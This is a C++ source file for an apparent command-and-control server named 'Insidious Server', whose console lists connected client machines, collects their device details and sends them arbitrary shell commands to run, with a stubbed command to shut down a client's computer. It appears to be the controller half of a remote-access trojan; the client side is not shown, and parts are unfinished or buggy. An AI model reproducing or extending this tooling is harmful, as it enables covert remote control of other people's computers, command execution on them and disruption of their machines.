//
//  main.cpp
//  Insidious Server
//

#include <iostream>
#include <time.h>
#include <sys/types.h>   // Types used in sys/socket.h and netinet/in.h
#include <netinet/in.h>  // Internet domain address structures and functions
#include <sys/socket.h>  // Structures and functions used for socket API
#include <pthread.h>
#include <stdio.h>
#include <string>
#include <vector>
#include "rapidjson/prettywriter.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/document.h"

using namespace std;
static int stopListening = 0;
static int socketHandle;
static vector<int> clients;

// New connected clients are sent to this function
static void *introduceClient(void* sock) {
    int* data = reinterpret_cast<int*>(sock);
    int Socket = *data;

    // Request the client for details about itself
    rapidjson::StringBuffer s;
    rapidjson::Writer<rapidjson::StringBuffer> writer(s);
    writer.StartObject();
    writer.String("req");
    writer.String("details");
    writer.EndObject();
    const char *message = s.GetString();
    send(Socket, message, strlen(message), 0);

    // TODO: Add timeout
    // TODO: Store client object with device information
    
    // Wait for response from client
    char buffer[1000] = "";
    ssize_t receivedMsg = recv(Socket, buffer, sizeof(buffer), 0);
    if(receivedMsg <= 0) return 0; // Ignore errors
    
    // Got message, parse the JSON
    rapidjson::Document document;
    if (document.Parse<0>(buffer).HasParseError()) {
        return 0; // Skip if error parsing
    }

    if(document["res"].IsString()) {
        if(strcmp(document["res"].GetString(), "details") == 0) {
            cout << "Got client info: " << buffer << "\n\n";
            clients.push_back(Socket); // Store client
            return 0; // All good to go, end it here
        }
    }
    
    close(Socket); // Close client connection, not giving information
    pthread_exit(0);
}

static void *listen(void* arg) {
    // create socket
    if((socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) < 0) {
        cout << "Could not create socket handle.\n";
        close(socketHandle);
        return 0;
    }
	
	struct sockaddr_in serverInf;
	serverInf.sin_family = AF_INET;
	serverInf.sin_addr.s_addr = INADDR_ANY;
	serverInf.sin_port = htons(55555);
    
	if(bind(socketHandle, (sockaddr*)&serverInf, sizeof(serverInf)) < 0) {
        cout << "Could not bind to socket. Try waiting a few moments.\n";
        close(socketHandle);
        return 0;
    }
    
	listen(socketHandle, 1);
	int TempSock;
    pthread_t clientThread;
    
    cout << "Listening for connections...\n";
	while(stopListening < 1) {
        clientThread = NULL;
        TempSock = accept(socketHandle, NULL, NULL);
        if(TempSock < 0) continue; // If accept() returns error, skip it
        pthread_create(&clientThread, NULL, introduceClient, new int(TempSock));
        TempSock = NULL;
	}
    
    cout << "Closing listen thread...\n";
    pthread_exit(0);
}

static void executeClientCommand(const char *cmd, int* socketInput) {
    int* data = reinterpret_cast<int*>(socketInput);
    int Socket = *data;
    
    rapidjson::StringBuffer s;
    rapidjson::Writer<rapidjson::StringBuffer> writer(s);
    writer.StartObject();
    writer.String("req");
    writer.String("execute");
    writer.String("cmd");
    writer.String(cmd);
    writer.EndObject();
    const char *message = s.GetString();
    send(Socket, message, strlen(message), 0);
    ssize_t receivedMsg;
    
    // Receive data
    char buffer[1024*1024] = "";
    while(1) {
        receivedMsg = recv(Socket, buffer, sizeof(buffer), 0);
        if(receivedMsg <= 0) break;
    }
    
    if(receivedMsg <= 0) {
        cout << "Received an error when reading from client. Not sure if the command was executed successfully.\n";
        return; // Ignore errors
    }
    
    // Got message, parse the JSON
    rapidjson::Document document;
    if (document.Parse<0>(buffer).HasParseError()) {
        cout << "Error parsing reply from client. Not sure if the command was executed successfully.\n";
        return; // Skip if error parsing
    }
    
    if(document["res"].IsString()) {
        if(strcmp(document["res"].GetString(), "execute") == 0) {
            cout << "Got command result: " << document["cmd"].GetString() << endl;
        }
    }
}

// Allows us to read arguments from server commands
std::vector<std::string> inline TokenizeCommand(const char* str)
{
    std::vector<std::string> tokens;
    size_t len = strlen(str);
        
    if (len) {
        bool inQuote = false;
        std::string curToken;
        
        for (int i = 0; i < len; i++) {
            if (str[i] == '"') {
                if (curToken.size() > 0) {
                    tokens.push_back(curToken);
                    curToken.clear();
                }
                inQuote = !inQuote;
                continue;
            }
            
            // If in quote append data regardless of what it is
            if (inQuote)
                curToken += str[i];
            else {
                if (str[i] == ' ') {
                    if (curToken.size() > 0) {
                        tokens.push_back(curToken);
                        curToken.clear();
                    }
                } else
                    curToken += str[i];
            }
        }
        if (curToken.size() > 0)
            tokens.push_back(curToken);
    }
    return tokens;
}

int main()
{
    // interactive console
    string input;
    pthread_t listenThread;
    
    cout << "Insidious Server\n";
    cout << "Welcome. Type 'help' for a list of all commands.\n\n";
    
    while(1) {
        cout << ">> ";
        getline(cin, input);
        std::vector<std::string> args = TokenizeCommand(input.c_str());
        
        if(input == "help") {
            cout << "Available commands:\n";
            cout << "   help            Displays this help message\n";
            cout << "   client info     Args: [id]. Get information about a given client\n";
            cout << "   execute         Args: [id] [cmd]. Runs a given command on a given client\n";
            cout << "   listen          Begin listening for connections\n";
            cout << "   list clients    Lists all connected clients\n";
            cout << "   shutdown        Args: [id]. Immediately shuts down the computer of a given client\n";
            cout << "   update          Args: [id]. Request a client to send its device details and save that info.\n";
            cout << "   exit            Stop the server, and close any open sockets\n";
        } else if(input == "listen") {
            pthread_create(&listenThread, NULL, listen, NULL);
            sleep(1); // Wait for thread to initialize
        } else if(input == "list clients") {
            cout << clients.size() << " client" << ((clients.size() != 1) ? "s" : "") << " connected.\n";
            for(std::vector<int>::size_type i = 0; i != clients.size(); i++) {
                cout << "   Client #" << i << endl;
            }
        } else if(input.compare(0, std::string("client info").length(), std::string("client info")) == 0) {
            if(args.size() != 3) {
                cout << "Usage: client info [clientID]. Get clientID from 'list clients'.\n";
                continue;
            }
            
            const char *argument = args[2].c_str();
            int clientID = atoi(argument);
            // (To Do)
        } else if(input.compare(0, std::string("execute").length(), std::string("execute")) == 0) {
            if(args.size() != 3) {
                cout << "Usage: execute [clientID] [command]. Get clientID from 'list clients'.\n";
                continue;
            }
            
            const char *argument = args[1].c_str();
            int clientID = atoi(argument);
            int clientSocket;
            
            try {
                clientSocket = clients.at(clientID);
            } catch(exception e) {
                cout << "Error: Could not find a client with the given ID.\n";
                continue;
            }
            
            cout << "Sending execute request to Client #" << clientID << "...\n";
            executeClientCommand(args[2].c_str(), new int(clients[clientID]));
        } else if(input.compare(0, std::string("shutdown").length(), std::string("shutdown")) == 0) {
            
        } else if(input == "exit") {
            stopListening = 1;
            if(socketHandle) {
                cout << "Closing socket...\n";
                shutdown(socketHandle, SHUT_RDWR); // Shutdown our socket
                close(socketHandle); // Close our socket entirely
            }
            cout << "Stopping server...\n";
            return 0;
        } else {
            cout << "Unknown command.\n";
        }
    }
    
	return 1;
}